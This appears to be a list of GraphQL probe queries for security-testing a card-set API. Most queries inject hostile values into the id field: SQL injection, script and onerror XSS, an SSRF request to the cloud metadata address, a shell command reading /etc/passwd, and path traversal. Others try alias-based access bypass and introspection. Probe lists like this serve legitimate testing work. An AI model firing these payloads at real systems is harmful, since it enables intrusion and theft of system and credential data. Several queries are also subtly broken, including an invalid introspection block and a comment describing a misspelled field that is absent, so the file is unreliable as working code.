query.query:
query {
  set(id: "base-1") {
    id
    name
    releaseDate
    logo
    cardCount {
      total
      official
    }
    boosters {
      id
      name
    }
  }
}

query {
  # Attempt SQL-like injection via the id parameter
  set(id: "base-1' OR '1'='1") {
    set
    name
    cardCount {
      total
    }
  }
}

query {
  # Inject script payload in id to see if reflected content causes XSS
  set(id: "<script>alert('xss')</script>") {
    set
    name
    logo
  }
}

query {
  # Provide an internal-metadata URL to detect SSRF if the backend fetches URLs
  set(id: "http://169.254.169.254/latest/meta-data/") {
    set
    name
  }
}

query {
  # OS command like payload in id to detect unsanitized shell execution
  set(id: "base-1; cat /etc/passwd") {
    set
    name
  }
}

query {
  # Path traversal style payload in id to test file path resolution vulnerabilities
  set(id: "../../../../etc/passwd") {
    set
    name
  }
}

query {
  # HTML snippet in id to detect stored/reflective HTML injection
  set(id: "<div><img src=x onerror=alert(1)></div>") {
    set
    name
  }
}

query {
  # Non-aliased attempt to access a potentially access-controlled set
  set(id: "admin-only") {
    set
    name
  }
}

query {
  # Aliased form to test deny/bypass by changing external API shape
  s: set(id: "admin-only") {
    set
    name
  }
}

query {
  # Introspection included alongside a set call to check schema exposure
  __schema {
    set {
      name
      fields {
        name
      }
    }
  }
  set(id: "base-1") {
    id
    name
  }
}

query {
  # Include a misspelled field ("nam") to trigger suggestion messages from the server,
  # while also requesting a valid field to keep intent clear.
  set(id: "base-1") {
    set
    name
    logo
  }
}
